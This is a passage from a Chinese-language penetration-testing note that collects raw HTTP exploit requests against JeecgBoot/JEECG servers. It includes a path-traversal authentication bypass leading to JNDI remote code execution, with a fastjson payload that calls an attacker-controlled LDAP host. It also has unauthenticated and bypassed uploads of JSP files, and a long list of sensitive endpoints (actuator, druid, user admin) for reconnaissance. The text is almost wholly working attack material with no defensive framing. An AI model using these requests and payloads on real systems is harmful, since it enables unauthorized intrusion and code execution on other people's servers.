<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">2、发送模板</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/sys/message/sysMessageTemplate/sendMsg HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: application/json, text/plain, */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Tenant-Id: 0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Dest: empty</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Mode: cors</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Site: cross-site</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Priority: u=0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Te: trailers</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/json;charset=UTF-8</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 64</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{"templateCode":"5","testData":"{}","receiver":"","msgType":"1"}</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">3、执行模板并查看返回结果</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">GET /jeecg-boot/sys/message/sysMessage/list?_t=1732776144&column=createTime&order=desc&field=id,,,esTitle,esContent,esReceiver,esSendNum,esSendStatus_dictText,esSendTime,esType_dictText,action&pageNo=1&pageSize=10 HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host:</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: application/json, text/plain, */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MzYyMTcyNDQsInVzZXJuYW1lIjoiYWRtaW4ifQ.-Z6FINUMTWQkOR6u009cde9BFyb-l65VWRhUXDz_2ao</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Tenant-Id: 0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Dest: empty</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Mode: cors</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Sec-Fetch-Site: cross-site</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Priority: u=0</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Te: trailers</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip</font>

## <font style="color:rgba(0, 0, 0, 0.85);">Jeecg-jeecgFormDemoController存在JNDI代码执行漏洞</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">JEECG 4.0 及之前版本中，由于 /api 接口鉴权时未过滤路径遍历，攻击 者可构造包含 ../ 的 url 绕过鉴权。 因为依赖 1.2.31 版本的 fastjson， 该版本存在反序列化漏洞。攻击者可对</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/../jeecgFormDemoController.do?interfaceTest 接口进行 jndi 注入攻 击实现远程代码执行。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /api/../jeecgFormDemoController.do?interfaceTest= HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Pragma: no-cache</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Cache-Control: no-cache</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Upgrade-Insecure-Requests: 1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate, br</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">cmd: whoami</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.9</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: application/x-www-form-urlencoded</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 77</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">serverUrl=http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">创建如下远程文件，其内容为fastjson代码执行的payload</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">{</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"a":{</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"@type":"java.lang.Class",</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"val":"com.sun.rowset.JdbcRowSetImpl"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">},</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"b":{</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"@type":"com.sun.rowset.JdbcRowSetImpl",</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"dataSourceName":"ldap://10.66.64.89:1389/8orsiq",</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">"autoCommit":true</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">}</font>

## <font style="color:rgba(0, 0, 0, 0.85);">jeecg-boot/jmreport/upload接口存在未授权任意文件上传</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">测试发现/jeecg-boot/jmreport/upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/jmreport/upload HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept: */*</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Language: zh-CN,zh;q=0.9</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Cache-Control: no-cache</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Pragma: no-cache</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host: </font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 1476</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundaryyfyhSCMs9cajzFD4</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Disposition: form-data; name="file"; filename="11111.txt"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: text/html</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"><%! 1111></font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundaryyfyhSCMs9cajzFD4</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Disposition: form-data; name="fileName"</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">11111.txt</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundaryyfyhSCMs9cajzFD4</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Disposition: form-data; name="biz"</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">excel_online</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundaryyfyhSCMs9cajzFD4--</font>

## <font style="color:rgba(0, 0, 0, 0.85);">Jeecg-commonController.do文件上传</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">由于 /api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ../ 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行。</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);"></font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">POST /jeecg-boot/api/../commonController.do?parserXml HTTP/1.1</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Host:</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Accept-Encoding: gzip, deflate</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Length: 360</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">User-Agent: Mozilla/2.0 (compatible; MSIE 3.01; Windows 95</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Connection: close</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundarygcflwtei</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Disposition: form-data; "name="name"</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">zW9YCa.png</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundarygcflwtei</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">ontent-Disposition: form-data; name="documentTitle"</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">blank</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundarygcflwtei</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Disposition: form-data; name="file"; filename="zW9YCa.jsp"</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">Content-Type: image/png</font>

<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">11111</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">------WebKitFormBoundarygcflwtei--</font>

## <font style="color:rgba(0, 0, 0, 0.85);">常见jeecg-boot常见接口</font>
<font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/v2/api-docs</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&parentPath=/</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg-boot/sys/user/querySysUser?username=admin</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/jeecg/</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/sys/</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/v2/api-docs</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/swagger-ui.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/env</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/mappings</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/metrics</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/beans</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/configprops</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator/metrics</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator/mappings</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator/beans</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator/configprops</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/actuator/httptrace</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/index.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/sql.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/weburi.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/websession.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/weburi.json</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/websession.json</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/druid/login.html</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api/config/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/queryById</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/user/changePassword</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/role/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/role/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/role/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/role/queryPermission</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/v2/api-docs</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/v1/api-docs</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/api-docs</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/menu/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/menu/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/menu/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/menu/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/depart/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/depart/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/depart/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/depart/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/fields/{tableName}</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/table/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/table/sync</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/online/cgform/generateCode</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/dict/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/dict/add</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/dict/edit</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/sys/dict/delete</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/process/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/process/deploy</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">/act/task/list</font><font style="color:rgb(51, 51, 51);background-color:rgb(248, 248, 248);">  
